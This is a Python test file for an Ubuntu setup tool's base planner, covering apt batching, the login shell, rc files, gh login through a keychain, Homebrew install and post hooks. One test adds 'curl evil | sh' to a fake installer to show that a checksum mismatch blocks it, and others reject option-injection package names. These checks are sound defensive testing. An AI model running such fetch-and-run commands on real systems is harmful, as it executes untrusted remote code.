"""The base planner and the built-in steps: apt batch, login shell, rc files, git/gh, brew, ``[[post]]``."""

import dataclasses
import hashlib
import os
import shutil
import time
import unittest
from pathlib import Path

from tests.util import TempDirCase, write
from ubuntu_tweaks.actions import ActionFailed, ManualStepRequired, Phase, Plan
from ubuntu_tweaks.context import Context
from ubuntu_tweaks.errors import ConfigError
from ubuntu_tweaks.planners import base
from ubuntu_tweaks.planners import packages as packages_planner
from ubuntu_tweaks.process import CommandError, CommandResult, FakeProcess
from ubuntu_tweaks.profile import Packages, Profile
from ubuntu_tweaks.settings import FakeBackend
from ubuntu_tweaks.steps import StepEnv

DPKG = "-f=${binary:Package}\\t${db:Status-Abbrev}\\n"
INSTALLER = b"#!/bin/bash\necho installing\n"
INSTALLER_SHA = hashlib.sha256(INSTALLER).hexdigest()


def ok(stdout: str = "") -> CommandResult:
    return CommandResult(0, stdout)


class BaseCase(TempDirCase):
    def setUp(self) -> None:
        super().setUp()
        self.repo = self.tmp / "repo"
        self.root = self.tmp / "root"
        self.home = self.tmp / "home"
        self.root.mkdir()
        self.home.mkdir()
        self.profile = Profile(self.tmp / "profile", "home")
        self.profile.root.mkdir()
        self.present_commands: set[str] = set()
        self.fetched: list[str] = []
        self.script = INSTALLER
        self.uid = os.getuid()
        write(self.root / "var/lib/apt/lists/archive.example_dists_x_main_binary-amd64_Packages", "")  # fresh lists

    def module(self, name: str, text: str) -> None:
        write(self.repo / "modules" / name / "module.toml", text)

    def overrides(self, env: StepEnv) -> StepEnv:
        def fetch(url: str) -> bytes:
            self.fetched.append(url)
            return self.script

        return dataclasses.replace(
            env,
            root=self.root,
            home=self.home,
            user="alice",
            group="staff",
            uid=self.uid,
            fetch=fetch,
            which=lambda command: f"/usr/bin/{command}" if command in self.present_commands else None,
        )

    def candidates(self, runner: FakeProcess, only: frozenset[str] = frozenset()) -> list:
        ctx = Context(self.repo, self.profile, only)
        return base.build(ctx, FakeBackend(), process=runner, env_overrides=self.overrides)

    def plan(self, runner: FakeProcess, only: frozenset[str] = frozenset()) -> Plan:
        return Plan.build(self.candidates(runner, only), only=only)


class AptBatchTests(BaseCase):
    TOOLS = 'phase = "base"\norder = 10\n[source]\nkind = "builtin"\n[install]\napt = ["curl", "git", "zsh"]\n'
    CLIP = 'phase = "base"\norder = 20\n[source]\nkind = "builtin"\n[install]\napt = ["xclip", "git"]\n'

    def test_modules_of_one_phase_share_one_batch_with_names_deduplicated(self) -> None:
        self.module("base-tools", self.TOOLS)
        self.module("clipboard", self.CLIP)
        runner = FakeProcess()

        (action,) = self.plan(runner).actions

        self.assertEqual(
            (action.kind, action.phase, action.needs_root, action.scope, action.order),
            ("package", Phase.BASE, True, "base-tools", 10),
        )
        self.assertEqual(action.describe(), "apt: install curl, git, zsh, xclip [base-tools, clipboard]")
        self.assertEqual(runner.queries[0][-4:], ("curl", "git", "zsh", "xclip"))

    def test_run_installs_only_what_is_missing_in_one_sudo_call(self) -> None:
        self.module("base-tools", self.TOOLS)
        dpkg = ("dpkg-query", "-W", DPKG, "curl", "git", "zsh")
        runner = FakeProcess({dpkg: ok("curl\tii \ngit\tii \n")})
        installed: list[str] = []
        runner._effects = lambda argv, _input: installed.append(" ".join(argv))  # noqa: SLF001

        (action,) = self.plan(runner).actions
        self.assertEqual(action.describe(), "apt: install zsh [base-tools]")
        action.run()

        self.assertEqual(installed, ["sudo -- apt-get install -y zsh"])

    def test_a_command_on_path_counts_as_the_package(self) -> None:
        self.module(
            "git-gh",
            self.TOOLS.replace('"curl", "git", "zsh"]', '"git", "gh"]')
            + '[install.provides]\ngh = "gh"\ngit = "git"\n',
        )
        self.present_commands = {"gh", "git"}
        self.assertEqual(self.plan(FakeProcess()).actions, ())

    def test_apt_update_runs_first_when_packages_toml_asks(self) -> None:
        self.module("base-tools", self.TOOLS)
        write(self.profile.packages_toml, "apt_update = true\n")
        runner = FakeProcess()
        runs: list[tuple[str, ...]] = []
        runner._effects = lambda argv, _input: runs.append(argv)  # noqa: SLF001
        (action,) = self.plan(runner).actions
        action.run()
        self.assertEqual(runs[0], ("sudo", "--", "apt-get", "update"))
        self.assertIn("(after apt-get update)", action.describe())

    def test_missing_or_stale_package_lists_run_apt_update_before_the_install(self) -> None:
        self.module("base-tools", self.TOOLS)
        lists = self.root / "var/lib/apt/lists"
        for age_days in (None, 3):  # no index at all, an index three days old
            shutil.rmtree(lists)
            lists.mkdir(parents=True)
            if age_days is not None:
                index = write(lists / "archive.example_dists_x_main_binary-amd64_Packages", "")
                stamp = time.time() - age_days * 24 * 3600
                os.utime(index, (stamp, stamp))
            runner = FakeProcess()
            runs: list[tuple[str, ...]] = []
            runner._effects = lambda argv, _input, runs=runs: runs.append(argv)  # noqa: SLF001
            (action,) = self.plan(runner).actions
            self.assertIn("(after apt-get update)", action.describe())
            action.run()
            self.assertEqual([run[2:4] for run in runs], [("apt-get", "update"), ("apt-get", "install")])

    def test_fresh_package_lists_are_not_refreshed(self) -> None:
        self.module("base-tools", self.TOOLS)
        runner = FakeProcess()
        runs: list[tuple[str, ...]] = []
        runner._effects = lambda argv, _input: runs.append(argv)  # noqa: SLF001
        (action,) = self.plan(runner).actions
        self.assertNotIn("apt-get update", action.describe())
        action.run()
        self.assertEqual([run[2:4] for run in runs], [("apt-get", "install")])

    def test_disabled_modules_and_modules_outside_only_contribute_nothing(self) -> None:
        self.module("base-tools", self.TOOLS)
        self.module("clipboard", self.CLIP)
        write(self.profile.machine_toml, "[modules.clipboard]\nenabled = false\n")
        (action,) = self.plan(FakeProcess()).actions
        self.assertNotIn("xclip", action.describe())

        write(self.profile.machine_toml, "")
        (only,) = self.plan(FakeProcess(), frozenset({"clipboard"})).actions
        self.assertEqual(only.describe(), "apt: install xclip, git [clipboard]")

    def test_modules_without_a_phase_install_in_the_packages_phase(self) -> None:
        self.module("later", '[source]\nkind = "builtin"\n[install]\napt = ["tree"]\n')
        (action,) = self.plan(FakeProcess()).actions
        self.assertEqual(action.phase, Phase.PACKAGES)

    def test_a_leading_dash_in_a_brew_name_is_refused_even_when_the_brew_module_is_off(self) -> None:
        write(self.profile.packages_toml, 'brew = ["--force"]\n')
        with self.assertRaisesRegex(ConfigError, "packages.toml brew: '--force' is not a package name"):
            packages_planner.build(Context(self.repo, self.profile), FakeBackend(), process=FakeProcess())

    def test_an_option_like_install_name_in_a_manifest_is_invalid_config(self) -> None:
        self.module("bad", '[source]\nkind = "builtin"\n[install]\napt = ["-oAPT::x=1"]\n')
        with self.assertRaisesRegex(ConfigError, "is not a package name"):
            self.candidates(FakeProcess())


class LoginShellTests(BaseCase):
    MODULE = 'phase = "base"\n[source]\nkind = "builtin"\n[[step]]\nname = "login-shell"\nshell = "zsh"\n'

    def test_a_bash_login_shell_is_changed_through_sudo_once_zsh_is_installed(self) -> None:
        self.module("zsh", self.MODULE)
        runner = FakeProcess({("getent", "passwd", "alice"): ok("alice:x:1000:1000:U:/home/alice:/bin/bash\n")})
        runs: list[tuple[str, ...]] = []
        runner._effects = lambda argv, _input: runs.append(argv)  # noqa: SLF001
        (action,) = self.plan(runner).actions

        self.assertEqual((action.kind, action.needs_root), ("login-shell", True))
        self.assertEqual(action.describe(), "chsh: set the login shell of alice to /usr/bin/zsh (now /bin/bash)")
        with self.assertRaisesRegex(ManualStepRequired, "/usr/bin/zsh is not installed yet"):
            action.run()
        write(self.root / "usr/bin/zsh", "")
        action.run()
        self.assertEqual(runs, [("sudo", "--", "chsh", "-s", "/usr/bin/zsh", "alice")])

    def test_any_zsh_login_shell_satisfies_it_including_brews(self) -> None:
        self.module("zsh", self.MODULE)
        entry = "alice:x:1000:1000:U:/home/alice:/home/linuxbrew/.linuxbrew/bin/zsh\n"
        self.assertEqual(self.plan(FakeProcess({("getent", "passwd", "alice"): ok(entry)})).actions, ())

    def test_an_unreadable_passwd_database_is_not_satisfied(self) -> None:
        self.module("zsh", self.MODULE)
        (action,) = self.plan(FakeProcess()).actions
        self.assertIn("(now unknown)", action.describe())

    def test_a_path_instead_of_a_shell_name_is_invalid_config(self) -> None:
        self.module("zsh", self.MODULE.replace('shell = "zsh"', 'shell = "/tmp/evil"'))
        with self.assertRaisesRegex(ConfigError, "a name like 'zsh', not a path"):
            self.candidates(FakeProcess())


class RcFileTests(BaseCase):
    MODULE = 'phase = "base"\n[source]\nkind = "builtin"\n[[step]]\nname = "shell-rc"\nshell = "zsh"\n'

    def test_missing_files_are_created_with_brew_and_local_bin(self) -> None:
        self.module("zsh", self.MODULE)
        plan = self.plan(FakeProcess())
        self.assertEqual(
            [a.describe() for a in plan.actions],
            [
                "create ~/.zprofile (brew shellenv, ~/.local/bin on PATH); only because it is absent",
                "create ~/.zshrc (brew shellenv, ~/.local/bin on PATH); only because it is absent",
            ],
        )
        plan.execute()
        zprofile = (self.home / ".zprofile").read_text(encoding="utf-8")
        self.assertIn('eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"', zprofile)
        self.assertIn('path=("$HOME/.local/bin" $path)', zprofile)
        self.assertEqual(len(self.plan(FakeProcess())), 0)

    def test_an_existing_file_is_never_touched_even_a_dangling_symlink(self) -> None:
        self.module("zsh", self.MODULE)
        write(self.home / ".zshrc", "my own\n")
        (self.home / ".zprofile").symlink_to(self.home / "nowhere")
        self.assertEqual(self.plan(FakeProcess()).actions, ())
        self.assertEqual((self.home / ".zshrc").read_text(encoding="utf-8"), "my own\n")

    def test_a_file_that_appears_between_preview_and_run_is_not_overwritten_and_not_an_error(self) -> None:
        self.module("zsh", self.MODULE)
        (first, _second) = self.plan(FakeProcess()).actions
        write(self.home / ".zprofile", "raced\n")
        first.run()
        self.assertEqual((self.home / ".zprofile").read_text(encoding="utf-8"), "raced\n")

    def test_a_file_the_profile_links_is_not_created_by_the_base_phase(self) -> None:
        self.module("zsh", self.MODULE)
        write(self.profile.files_dir / ".zshrc", "mine\n")
        self.assertEqual(
            [a.describe() for a in self.plan(FakeProcess()).actions],
            ["create ~/.zprofile (brew shellenv, ~/.local/bin on PATH); only because it is absent"],
        )
        write(self.profile.overlay_files_dir / ".zprofile", "this machine\n")
        self.assertEqual(self.plan(FakeProcess()).actions, ())

    def test_with_only_the_links_are_not_in_the_plan_so_the_files_are_still_created(self) -> None:
        self.module("zsh", self.MODULE)
        write(self.profile.files_dir / ".zshrc", "mine\n")
        only = frozenset({"zsh"})
        self.assertEqual(len(self.plan(FakeProcess(), only)), 2)


class GitTests(BaseCase):
    MODULE = (
        'phase = "base"\n[source]\nkind = "builtin"\n[[step]]\nname = "git-identity"\n'
        '[[step]]\nname = "gh-login"\n[[step]]\nname = "git-credential-helper"\n'
    )
    STATUS = ("gh", "auth", "status", "--hostname", "github.com")
    EXISTS = ("keychain", "exists", "--no-prompt", "--caller", "ubuntu-tweaks", "ubuntu-tweaks/gh-token")

    def setUp(self) -> None:
        super().setUp()
        self.module("git-gh", self.MODULE)
        self.present_commands = {"gh", "git"}
        write(self.profile.profile_toml, '[git]\nname = "Ada"\nemail = "ada@example.org"\n')

    def test_without_gh_the_follow_up_steps_are_manual_not_a_crash(self) -> None:
        self.present_commands = set()
        runner = FakeProcess({self.EXISTS: ok()})
        for kind in ("gh-login", "git-credential"):
            (action,) = [a for a in self.plan(runner).actions if a.kind == kind]
            with self.assertRaisesRegex(ManualStepRequired, "gh is not installed yet"):
                action.run()
        self.assertEqual(runner.executed, [])

    def test_a_rejected_token_or_an_offline_host_is_a_manual_step_never_an_abort(self) -> None:
        class Failing(FakeProcess):
            def execute(self, argv, *, input_text=None, cwd=None):  # type: ignore[no-untyped-def]
                raise CommandError("gh: HTTP 401 Bad credentials", 1)

        (action,) = [a for a in self.plan(Failing({self.EXISTS: ok()})).actions if a.kind == "gh-login"]
        with self.assertRaisesRegex(
            ManualStepRequired, r"gh auth login \(the keychain token was not accepted or github.com is unreachable"
        ):
            action.run()

    def test_describe_asks_the_keychain_once(self) -> None:
        runner = FakeProcess({self.EXISTS: ok()})
        (action,) = [a for a in self.plan(runner).actions if a.kind == "gh-login"]
        before = len(runner.queries)
        action.describe()
        action.describe()
        self.assertEqual(len(runner.queries), before + 1)

    def test_identity_comes_from_the_profile_and_is_only_set_when_different(self) -> None:
        runner = FakeProcess(
            {
                ("git", "config", "--global", "--get", "user.name"): ok("Ada\n"),
                ("git", "config", "--global", "--get", "user.email"): ok("old@example.org\n"),
            }
        )
        actions = [a for a in self.plan(runner).actions if a.kind == "git-config"]
        (action,) = actions
        self.assertEqual(action.describe(), "git config --global user.email ada@example.org (now old@example.org)")
        executed: list[tuple[str, ...]] = []
        runner._effects = lambda argv, _input: executed.append(argv)  # noqa: SLF001
        action.run()
        self.assertEqual(executed, [("git", "config", "--global", "user.email", "ada@example.org")])

    def test_no_identity_in_the_profile_is_never_invented_and_warns(self) -> None:
        write(self.profile.profile_toml, "")
        kinds = [a.kind for a in self.plan(FakeProcess()).actions]
        self.assertNotIn("git-config", kinds)
        ctx = Context(self.repo, self.profile)
        self.assertEqual(
            base.warnings(ctx, FakeBackend()),
            [
                "git: [git] name and email not set in profile.toml / machine.toml: git config user.name and user.email stays as it is"
            ],
        )

    def test_unknown_git_key_is_invalid_config(self) -> None:
        write(self.profile.profile_toml, '[git]\nsigningkey = "x"\n')
        with self.assertRaisesRegex(ConfigError, r"\[git\]: unknown key\(s\) signingkey"):
            self.candidates(FakeProcess())

    def test_login_uses_the_keychain_through_stdin_never_argv(self) -> None:
        runner = FakeProcess({self.EXISTS: ok()})
        (action,) = [a for a in self.plan(runner).actions if a.kind == "gh-login"]
        self.assertEqual(
            action.describe(),
            "gh: log in to github.com with the token of keychain item ubuntu-tweaks/gh-token (read at run time, never stored)",
        )
        executed: list[tuple[str, ...]] = []
        runner._effects = lambda argv, _input: executed.append(argv)  # noqa: SLF001
        action.run()
        self.assertEqual(
            executed,
            [
                (
                    "keychain",
                    "exec",
                    "--no-prompt",
                    "--caller",
                    "ubuntu-tweaks",
                    "--stdin",
                    "ubuntu-tweaks/gh-token",
                    "--",
                    "gh",
                    "auth",
                    "login",
                    "--hostname",
                    "github.com",
                    "--with-token",
                )
            ],
        )

    def test_no_token_is_a_manual_step_that_never_prompts_and_stays_missing(self) -> None:
        for code, reason in (
            (127, "the keychain CLI is not installed"),
            (4, "keychain item ubuntu-tweaks/gh-token does not exist"),
            (9, "the keyring is locked"),
        ):
            with self.subTest(code=code):
                runner = FakeProcess({self.EXISTS: CommandResult(code)})
                (action,) = [a for a in self.plan(runner).actions if a.kind == "gh-login"]
                self.assertTrue(action.describe().startswith("needs manual: gh auth login ("))
                self.assertIn(reason, action.describe())
                with self.assertRaisesRegex(ManualStepRequired, "gh auth login"):
                    action.run()
                self.assertEqual(runner.executed, [])
                self.assertFalse(action.check())

    def test_a_logged_in_gh_and_a_configured_helper_are_satisfied(self) -> None:
        runner = FakeProcess(
            {
                self.STATUS: ok(),
                ("git", "config", "--global", "--get-all", "credential.https://github.com.helper"): ok(
                    "\n!/home/linuxbrew/.linuxbrew/bin/gh auth git-credential\n"
                ),
                ("git", "config", "--global", "--get", "user.name"): ok("Ada\n"),
                ("git", "config", "--global", "--get", "user.email"): ok("ada@example.org\n"),
            }
        )
        self.assertEqual(self.plan(runner).actions, ())

    def test_token_ref_and_host_can_be_overridden_in_the_profile(self) -> None:
        write(self.profile.profile_toml, '[git]\ntoken_ref = "mine/token"\nhost = "git.example.org"\n')
        runner = FakeProcess({("keychain", "exists", "--no-prompt", "--caller", "ubuntu-tweaks", "mine/token"): ok()})
        described = [a.describe() for a in self.plan(runner).actions if a.kind in {"gh-login", "git-credential"}]
        self.assertTrue(any("git.example.org" in text and "mine/token" in text for text in described))

    def test_credential_helper_is_set_up_for_the_host(self) -> None:
        runner = FakeProcess()
        (action,) = [a for a in self.plan(runner).actions if a.kind == "git-credential"]
        executed: list[tuple[str, ...]] = []
        runner._effects = lambda argv, _input: executed.append(argv)  # noqa: SLF001
        action.run()
        self.assertEqual(executed, [("gh", "auth", "setup-git", "--hostname", "github.com", "--force")])


class BrewTests(BaseCase):
    URL = "https://raw.githubusercontent.com/Homebrew/install/" + "a" * 40 + "/install.sh"
    MODULE = (
        'phase = "base"\n[source]\nkind = "builtin"\n[[step]]\nname = "brew-prefix"\n'
        f'[[step]]\nname = "brew-install"\nurl = "{URL}"\nsha256 = "{INSTALLER_SHA}"\n'
    )

    def setUp(self) -> None:
        super().setUp()
        self.module("brew", self.MODULE)
        self.prefix = self.root / "home/linuxbrew/.linuxbrew"

    def actions(self, runner: FakeProcess) -> dict[str, object]:
        return {a.kind: a for a in self.plan(runner).actions}

    def test_prefix_is_a_root_step_and_install_is_not(self) -> None:
        by_kind = self.actions(FakeProcess())
        self.assertEqual((by_kind["brew-prefix"].needs_root, by_kind["brew-install"].needs_root), (True, False))
        self.assertEqual(
            by_kind["brew-prefix"].describe(),
            "create /home/linuxbrew/.linuxbrew owned by alice:staff (the one step of the Homebrew install that needs root)",
        )
        self.assertIn("refused unless sha256 is " + INSTALLER_SHA[:12], by_kind["brew-install"].describe())

    def test_prefix_runs_install_d_with_the_user_through_sudo(self) -> None:
        runner = FakeProcess()
        executed: list[tuple[str, ...]] = []
        runner._effects = lambda argv, _input: executed.append(argv)  # noqa: SLF001
        self.actions(runner)["brew-prefix"].run()
        self.assertEqual(
            executed, [("sudo", "--", "install", "-d", "-o", "alice", "-g", "staff", "/home/linuxbrew/.linuxbrew")]
        )

    def test_an_installed_brew_satisfies_both_steps(self) -> None:
        write(self.prefix / "bin/brew", "")
        self.assertEqual(self.plan(FakeProcess()).actions, ())

    def test_a_prefix_owned_by_the_user_satisfies_the_prefix_step_only(self) -> None:
        self.prefix.mkdir(parents=True)
        self.assertEqual(list(self.actions(FakeProcess())), ["brew-install"])

    def test_a_prefix_the_user_does_not_own_is_a_manual_step_with_the_chown_and_changes_nothing(self) -> None:
        self.uid = os.getuid() + 1  # the directory exists, but it is "root's"
        self.prefix.mkdir(parents=True)
        runner = FakeProcess()
        prefix = self.actions(runner)["brew-prefix"]
        with self.assertRaisesRegex(
            ManualStepRequired, r"run `sudo chown -R alice:staff /home/linuxbrew/.linuxbrew` yourself"
        ):
            prefix.run()
        self.assertEqual(runner.executed, [])

    def test_install_verifies_the_checksum_then_runs_the_script_non_interactively(self) -> None:
        self.prefix.mkdir(parents=True)
        runner = FakeProcess()
        seen: list[tuple[str, ...]] = []
        contents: list[bytes] = []

        def effect(argv: tuple[str, ...], _input: str | None) -> None:
            seen.append(argv)
            contents.append(Path(argv[-1]).read_bytes())

        runner._effects = effect  # noqa: SLF001
        install = self.actions(runner)["brew-install"]
        install.run()

        (argv,) = seen
        self.assertEqual(argv[:3], ("env", "NONINTERACTIVE=1", "/bin/bash"))
        self.assertEqual(contents, [INSTALLER])
        self.assertFalse(Path(argv[-1]).exists(), "the downloaded installer is removed afterwards")
        self.assertEqual(self.fetched, [self.URL])

    def test_a_tampered_installer_is_refused_and_never_run(self) -> None:
        self.prefix.mkdir(parents=True)
        self.script = INSTALLER + b"curl evil | sh\n"
        runner = FakeProcess()
        with self.assertRaisesRegex(ActionFailed, "refusing the Homebrew installer: sha256 is"):
            self.actions(runner)["brew-install"].run()
        self.assertEqual(runner.executed, [])

    def test_without_the_root_step_the_install_is_a_manual_step_and_downloads_nothing(self) -> None:
        runner = FakeProcess()
        with self.assertRaisesRegex(ManualStepRequired, "its root step did not run"):
            self.actions(runner)["brew-install"].run()
        self.assertEqual(self.fetched, [])

    def test_a_plain_http_url_or_a_bad_digest_is_invalid_config(self) -> None:
        self.module("brew", self.MODULE.replace("https://", "http://"))
        with self.assertRaisesRegex(ConfigError, "url must be https"):
            self.candidates(FakeProcess())
        self.module("brew", self.MODULE.replace(INSTALLER_SHA, "abc"))
        with self.assertRaisesRegex(ConfigError, "sha256 must be 64 hex digits"):
            self.candidates(FakeProcess())


class PostTests(BaseCase):
    def post_module(self, body: str, extra: str = "") -> None:
        self.module("brew", 'order = 40\nphase = "base"\n[source]\nkind = "builtin"\n' + extra + body)

    def test_placeholder_expands_to_the_packages_toml_names_and_empty_means_not_planned(self) -> None:
        self.post_module(
            '[[post]]\nname = "formulae"\nrun = ["/bin/echo", "install", "{packages.brew}"]\n'
            'check = ["/bin/echo", "list", "{packages.brew}"]\n'
        )
        self.assertEqual(self.candidates(FakeProcess()), [])
        write(self.profile.packages_toml, 'brew = ["ripgrep", "fd"]\n')
        write(self.profile.overlay_packages_toml, 'brew = ["fd", "tmux"]\n')

        (action,) = self.candidates(FakeProcess())

        self.assertEqual(action.describe(), "brew: formulae: /bin/echo install ripgrep fd tmux")

    def test_check_decides_and_run_goes_through_the_module_directory_and_sudo_only_when_asked(self) -> None:
        self.post_module(
            '[[post]]\nname = "wire"\ndescription = "wire it up"\nrun = ["/bin/true"]\ncheck = ["/bin/false"]\n'
            '[[post]]\nname = "root-thing"\nneeds_root = true\nrun = ["/bin/true"]\ncheck = ["/bin/true"]\n'
        )
        runner = FakeProcess({("/bin/false",): CommandResult(1), ("/bin/true",): ok()})
        executed: list[tuple[str, ...]] = []
        runner._effects = lambda argv, _input: executed.append(argv)  # noqa: SLF001
        wire, rooted = self.candidates(runner)

        self.assertFalse(wire.check())
        self.assertTrue(rooted.check())
        self.assertEqual(wire.describe(), "brew: wire it up")
        wire.run()
        rooted.run()
        self.assertEqual(executed, [("/bin/true",), ("sudo", "--", "/bin/true")])
        self.assertEqual((wire.phase, wire.order, rooted.needs_root), (Phase.BASE, 40.5, True))

    def test_a_program_that_does_not_exist_yet_is_a_manual_step_not_a_crash(self) -> None:
        self.post_module(
            '[[post]]\nname = "late"\nrun = ["/no/such/brew", "install", "x"]\ncheck = ["/no/such/brew"]\n'
        )
        (action,) = self.candidates(FakeProcess())
        with self.assertRaisesRegex(ManualStepRequired, "/no/such/brew, which is not there yet"):
            action.run()

    def test_posts_follow_their_modules_steps_and_install_in_the_plan(self) -> None:
        self.post_module(
            '[[post]]\nname = "after"\nrun = ["/bin/true"]\ncheck = ["/bin/false"]\n',
            '[[step]]\nname = "brew-prefix"\n[install]\napt = ["curl"]\n',
        )
        self.module("zsh", 'order = 11\nphase = "base"\n[source]\nkind = "builtin"\n[install]\napt = ["zsh"]\n')
        runner = FakeProcess({("/bin/false",): CommandResult(1)})
        kinds = [(a.kind, a.order) for a in self.plan(runner).actions]
        self.assertEqual(kinds, [("package", 11), ("brew-prefix", 40), ("post", 40.5)])

    def test_a_failing_post_command_names_module_and_post(self) -> None:
        self.post_module('[[post]]\nname = "boom"\nrun = ["/bin/true"]\ncheck = ["/bin/false"]\n')

        class Failing(FakeProcess):
            def execute(self, argv, *, input_text=None, cwd=None):  # type: ignore[no-untyped-def]
                raise CommandError("exited with status 2", 2)

        (action,) = self.candidates(Failing())
        with self.assertRaisesRegex(ActionFailed, "brew: boom: exited with status 2"):
            action.run()

    def test_a_system_modules_post_waits_for_its_installer_check(self) -> None:
        self.module(
            "svc",
            '[source]\nkind = "system"\ninstall = "i.sh"\ncheck = "i.sh --check"\n'
            '[[post]]\nname = "wire"\nafter = "install"\nrun = ["/bin/true"]\ncheck = ["/bin/false"]\n',
        )
        checker = str(self.repo / "modules/svc/i.sh")
        runner = FakeProcess({("/bin/false",): CommandResult(1), (checker, "--check"): CommandResult(3)})
        (wire,) = self.candidates(runner)
        with self.assertRaisesRegex(ManualStepRequired, r"wire waits for its install \(\[system-module\]"):
            wire.run()
        runner._responses[(checker, "--check")] = ok()  # noqa: SLF001
        wire.run()
        self.assertEqual(runner.executed, [(("/bin/true",), None)])

    def test_a_post_after_an_omitted_post_still_waits_for_the_install(self) -> None:
        self.post_module(
            '[[post]]\nname = "first"\nafter = "install"\nrun = ["/bin/true", "{packages.brew}"]\ncheck = ["/bin/false"]\n'
            '[[post]]\nname = "second"\nafter = "first"\nrun = ["/bin/true"]\ncheck = ["/bin/false"]\n',
            '[[step]]\nname = "brew-prefix"\n',
        )
        (_prefix, second) = self.candidates(FakeProcess({("/bin/false",): CommandResult(1)}))
        with self.assertRaisesRegex(ManualStepRequired, "second waits for its install"):
            second.run()

    def test_a_post_after_install_waits_for_its_modules_steps_and_does_not_run_without_them(self) -> None:
        self.post_module(
            '[[post]]\nname = "wire"\nafter = "install"\nrun = ["/bin/true"]\ncheck = ["/bin/false"]\n'
            '[[post]]\nname = "next"\nafter = "wire"\nrun = ["/bin/true"]\ncheck = ["/bin/false"]\n',
            '[[step]]\nname = "brew-prefix"\n',
        )
        runner = FakeProcess({("/bin/false",): CommandResult(1)})
        executed: list[tuple[str, ...]] = []
        runner._effects = lambda argv, _input: executed.append(argv)  # noqa: SLF001
        _prefix, wire, follow = self.candidates(runner)

        with self.assertRaisesRegex(ManualStepRequired, r"wire waits for its install \(\[brew-prefix\]"):
            wire.run()
        with self.assertRaisesRegex(ManualStepRequired, r"next waits for its install \(\[brew-prefix\]"):
            follow.run()
        self.assertEqual(executed, [])

        self.prefix = self.root / "home/linuxbrew/.linuxbrew"
        self.prefix.mkdir(parents=True)
        wire.run()
        self.assertEqual(executed, [("/bin/true",)])

    def test_a_post_without_after_waits_for_the_install_like_after_install(self) -> None:
        self.post_module(
            '[[post]]\nname = "wire"\nrun = ["/bin/true"]\ncheck = ["/bin/false"]\n', '[[step]]\nname = "brew-prefix"\n'
        )
        runner = FakeProcess({("/bin/false",): CommandResult(1)})
        _prefix, wire = self.candidates(runner)
        with self.assertRaisesRegex(ManualStepRequired, r"wire waits for its install \(\[brew-prefix\]"):
            wire.run()
        self.assertEqual(runner.executed, [])

    def test_unless_linked_drops_the_post_when_the_profile_links_one_of_the_files(self) -> None:
        self.post_module(
            '[[post]]\nname = "shellenv"\nunless_linked = [".bashrc", ".profile"]\nrun = ["/bin/true"]\n'
            'check = ["/bin/false"]\n[[post]]\nname = "tools"\nafter = "shellenv"\nrun = ["/bin/true"]\n'
            'check = ["/bin/false"]\n'
        )
        runner = FakeProcess({("/bin/false",): CommandResult(1)})
        self.assertEqual([a.key for a in self.candidates(runner)], ["post:brew:shellenv", "post:brew:tools"])
        write(self.profile.overlay_files_dir / ".profile", "mine\n")
        self.assertEqual([a.key for a in self.candidates(runner)], ["post:brew:tools"])

    def test_a_system_installer_probe_gets_the_module_options(self) -> None:
        self.module(
            "svc",
            '[source]\nkind = "system"\ninstall = "i.sh"\ncheck = "i.sh --check"\n'
            '[[post]]\nname = "wire"\nrun = ["/bin/true"]\ncheck = ["/bin/false"]\n',
        )
        write(self.profile.machine_toml, '[modules.svc]\nenabled = true\nflavor = "x"\n')
        runner = FakeProcess({("/bin/false",): CommandResult(1)})
        (wire,) = self.candidates(runner)
        with self.assertRaises(ManualStepRequired):
            wire.run()
        probes = [argv for argv in runner.queries if argv[:1] == ("env",)]
        checker = str(self.repo / "modules/svc/i.sh")
        self.assertEqual(probes, [("env", 'UBUNTU_TWEAK_MODULE_CONFIG={"flavor":"x"}', checker, "--check")])

    def test_unknown_step_is_invalid_config(self) -> None:
        self.post_module('[[step]]\nname = "make-coffee"\n')
        with self.assertRaisesRegex(ConfigError, "unknown step 'make-coffee'; known: "):
            self.candidates(FakeProcess())

    def test_packages_dataclass_reads_brew_from_the_union(self) -> None:
        write(self.profile.packages_toml, 'brew = ["a"]\n')
        write(self.profile.overlay_packages_toml, 'brew = ["b", "a"]\n')
        self.assertEqual(self.profile.load_packages(), Packages(brew=("a", "b")))


if __name__ == "__main__":
    unittest.main()
